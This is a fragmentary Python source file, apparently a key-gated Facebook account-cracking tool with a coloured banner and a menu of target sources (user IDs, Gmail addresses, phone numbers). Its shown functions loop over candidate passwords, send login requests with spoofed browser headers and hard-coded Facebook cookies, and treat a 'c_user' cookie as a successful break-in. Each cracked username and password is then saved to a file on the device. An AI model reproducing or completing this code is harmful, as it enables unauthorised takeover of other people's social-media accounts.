...
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
fst=f'{dot}[{H}sathi{M}={H}abir{M}={H}tisha{M}={H}Alif{M}={H}samim{P}]'
...
d88P     888 88888888 8888888 888        

\033[1;32m╔═════════════════════════════════════════════╗
\033[1;32m║  \033[1;33m[•]  TOOLS OWNER  : \033[1;33mALIF         \033[1;32m          ║
\033[1;32m║  \033[1;32m[•]  Tools Coder  : \033[1;32mMD ALIF         \033[1;32m       ║
\033[1;32m║  \033[1;35m[•]  GITHUB       : \033[1;35mAL1F-IS-BACK           \033[1;32m║
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/AL1F-IS-BACK/tst/blob/main/tst.txt').text
    if id in httpCaht:
      #print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      os.system('espeak -a 300 "Assalamualaikum,  Welcome To ALIF Tools  Send,   Your,   Key, Please"')
...
def mainx():
    ...
    print(f'{K} [{H}2{K}] {N}Follow Github ')
    print(f'{K} [{H}3{K}] {N}Contact With Admin')
...
def setting():
    ...
    linex()
    xd_cp=input(f'{wt}Do You Want To Show Cp Id  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
    else:cp_xdx.append('n')
    linex()
    cokixx=input(f'{wt}Do You Want To Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));linex();print(f' {K}[{H}1{K}] {P}Method 1');print(f' {K}[{H}2{K}] {P}Method 2');print(f' {K}[{H}3{K}] {P}Method 3');print(f' {K}[{H}4{K}] {P}Method 4');print(f' {K}[{H}5{K}] {P}Method 5');print(f' {K}[{H}6{K}] {P}Method 6');linex()
...
def gf1(): 
    ...
    tkk = first+last
    banner();print(f"{dot}{P}Gmail Ids {RED}: {tkk[:4]}****{domain}");linex();print(f' {K}[{H}1{K}] {P}Method 1');print(f' {K}[{H}2{K}] {P}Method 2');print(f' {K}[{H}3{K}] {P}Method 3')
    print(f' {K}[{H}4{K}] {P}Method 4');print(f' {K}[{H}5{K}] {P}Method 5');print(f' {K}[{H}6{K}] {P}Method 6');linex()
...
def x8():
  ...
  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);linex();print(f' {K}[{H}1{K}] {P}Method 1');print(f' {K}[{H}2{K}] {P}Method 2');print(f' {K}[{H}3{K}] {P}Method 3')
  print(f' {K}[{H}4{K}] {P}Method 4');print(f' {K}[{H}5{K}] {P}Method 5');print(f' {K}[{H}6{K}] {P}Method 6');linex()
  hc = input(f'{wt}Select Method {M}:{H} ')
  for nmbr in range(limit):
...
def m4(idx,pwv):
 ...
 # gif = random.choice(["\x1b[1;91m•    ","\x1b[1;92m••   ","\x1b[1;93m•••  ","\x1b[1;94m•••• ","\x1b[1;95m•••••"])
  ...
  for pw in pwv:
    ...
    # 'cookie': 'sb=RGp2ZYe7wNy7mZScaHs3dYNt; datr=RGp2ZWeK01AO9esXy4tOPwO5; m_pixel_ratio=2.0000000298023224; dpr=2.0000000298023224; wd=400x660; fr=0WLNVPxmE7cjOIDoC..BldmpE.WE.AAA.0.0.Bld61A.AWXnj_xvk_w',
    'dpr': '1.25',
...
def f1(idf,pwv):
  ...
  for pw in pwv:
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=RGp2ZYe7wNy7mZScaHs3dYNt; datr=RGp2ZWeK01AO9esXy4tOPwO5; m_pixel_ratio=2.0000000298023224; dpr=2.0000000298023224; wd=400x660; fr=0WLNVPxmE7cjOIDoC..BldmpE.WE.AAA.0.0.Bld638.AWXGCzDdCIg',
    'dpr': '1.25',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.71", "Google Chrome";v="120.0.6099.71"',
 ...
 try:
  for ps in pw:
   ...
   header_freefb = {
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=RGp2ZYe7wNy7mZScaHs3dYNt; datr=RGp2ZWeK01AO9esXy4tOPwO5; m_pixel_ratio=2.0000000298023224; dpr=2.0000000298023224; wd=400x660; fr=0WLNVPxmE7cjOIDoC..BldmpE.WE.AAA.0.0.Bld61D.AWU3CKVyKfE',
    'dpr': '1.25',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.71", "Google Chrome";v="120.0.6099.71"',
   ...
   if 'c_user' in log_cookies:
    ...
    ok+=1 
    open(' /sdcard/CYB3R-A1IF-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
